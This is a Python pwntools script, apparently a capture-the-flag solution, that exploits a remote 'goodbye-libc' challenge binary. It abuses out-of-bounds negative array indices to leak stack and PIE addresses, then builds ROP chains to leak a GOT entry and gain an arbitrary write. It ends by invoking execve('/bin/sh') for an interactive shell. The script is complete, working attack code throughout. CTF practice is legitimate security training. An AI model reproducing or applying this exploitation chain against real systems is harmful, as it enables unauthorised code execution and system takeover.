from pwn import *

binary = './goodbye-libc'
elf = context.binary = ELF(binary)
byelibc = ELF('./libbye-libc.so')

context.log_level = 'debug'

#p = process(binary)
p = remote("streams.tamuctf.com", 443, ssl=True, sni="goodbye-libc")

# Write to nums array
def write_num(index, val):
    p.recvuntil(b"7. Exit")
    p.sendline(b"1")
    p.recvuntil(b"write to [1-3]:")
    p.sendline(index)
    p.recvuntil(b"to write:")
    p.sendline(val)

# Read value from nums array
def print_num(index):
    p.recvuntil(b"7. Exit")
    p.sendline(b"6")
    p.recvuntil(b"to read from [1-3]:")
    p.sendline(index)
    p.recvuntil(b"written: ")
    return int(p.recvline()[:-1])



"""
First step: obtaining stack leak
"""
# Sending stack leak (-2)
payload = str(int(0xfffffffe)).encode('utf-8')
stack = print_num(payload)
print("Index -2 (stack leak): ", hex(stack))



"""
Second step: obtaining PIE leak
"""
# Sending PIE leak (-1)
payload = str(int(0xffffffff)).encode('utf-8')
pie = print_num(payload)
print("Index -1 (PIE leak): ", hex(pie))

elf.address = pie-1905-elf.sym["_start"]
print("_start address:", hex(elf.sym["_start"]))


"""
Third step: obtaining GOT leak with ROP
"""

"""
Creating ROP chain:

First, we need to control RAX and RBP:
By jumping to 'input_num'+1, we can control RAX and get access to a POP RBP
We do this at end, since this overwrite triggers ROP
After, we jump to 'print_expression'+172 to perform read from RAX, and then jump to RBP
"""

# Setting RBP to '_start' with POP RBP
rbp = stack - 0x38

# Overwriting 0 with rbp
index = str(int(0)).encode('utf-8')
payload = str(rbp).encode('utf-8')
write_num(index, payload)



# We use 'print_expression'+172 to obtain leak of address stored in RAX
print_exp = elf.sym["print_expression"]+172

index = str(int(1)).encode('utf-8')
payload = str(print_exp).encode('utf-8')
write_num(index, payload)

# Return back to _start
start = elf.sym["_start"]

index = str(int(2)).encode('utf-8')
payload = str(start).encode('utf-8')
write_num(index, payload)



# Beginning of ROP chain:
# We jump to 'input_num'+1, we can control RAX and get access to a POP RBP
ret = elf.sym["input_num"]+1

# Overwriting -1 with ret: executes our ROP chain
index = str(int(0xffffffff)).encode('utf-8')
payload = str(ret).encode('utf-8')
write_num(index, payload)


# Write to the 'input_num' (stores in RAX) in order to obtain leak:
payload = str(int(elf.got["exit"])).encode('utf-8')

p.sendline(payload)



# Parsing leak:
exit_leak = int.from_bytes(p.recvline()[1:9], byteorder='little')
print("exit leak:", hex(exit_leak))
byelibc.address = exit_leak - byelibc.sym["exit"]
print("Base byelibc address:", hex(byelibc.address))


"""
Fourth step: Obtaining arbitrary write for execve('/bin/sh')
"""

"""
0x000000000000103f : pop rdi ; pop rsi ; pop rdx ; ret

We do not have enough stack space for this gadget, so we need arbitrary write first so we can create a longer ROPchain
If we control RAX and RBP, we can ROP straight to writeable location using 'input_num'+12
RAX = location we write to, RBP = location we return to
"""


# We need rbp to be the value we return to
rbp = elf.address+0x4800-8

# Overwriting 0 with rbp
index = str(int(0)).encode('utf-8')
payload = str(rbp).encode('utf-8')
write_num(index, payload)


# We go to 'input_num'+12 to perform arbitrary write
rbp = elf.sym["input_num"]+12

# Overwriting 1 with arb write function
index = str(int(1)).encode('utf-8')
payload = str(rbp).encode('utf-8')
write_num(index, payload)



# Beginning of ROP chain, 'input_num'+1 used to control RBP and RAX
ret = elf.sym["input_num"]+1

# Overwriting -1 with 'input_num'+1: executes our ROP chain
index = str(int(0xffffffff)).encode('utf-8')
payload = str(ret).encode('utf-8')
write_num(index, payload)


# Write to the 'input_num' (sets RAX) in order to obtain arb write at our chosen location:
payload = str(int(elf.address + 0x4800)).encode('utf-8')

p.sendline(payload)

print("Type <ENTER> to continue: ")
input()

"""
Fifth step: writing ROPchain for execve("/bin/sh")
"""

"""
We set RAX to 59 (0x3b) for execve, then use gadget to control RDI, RSI, and RDX
Finally we syscall
"""

# 0x000000000000103f : pop rdi ; pop rsi ; pop rdx ; ret
pop_rdi_rsi_rdx = byelibc.address+0x000000000000103f

# 0x0000000000001039 : syscall
syscall = byelibc.address + 0x0000000000001039

# ROP chain:
payload = p64(elf.sym["input_num"])
payload += p64(pop_rdi_rsi_rdx)
# Points to '/bin/sh' written further down
payload += p64(elf.address + 0x4800 + 0x30)
payload += p64(0)
payload += p64(0)

payload += p64(syscall)

# '/bin/sh' written to RDI
payload += b"/bin/sh\0"
p.sendline(payload)


# Write 0x3b to 'input_num' in order to execve:
payload = str(int(59)).encode('utf-8')
p.sendline(payload)


p.interactive()









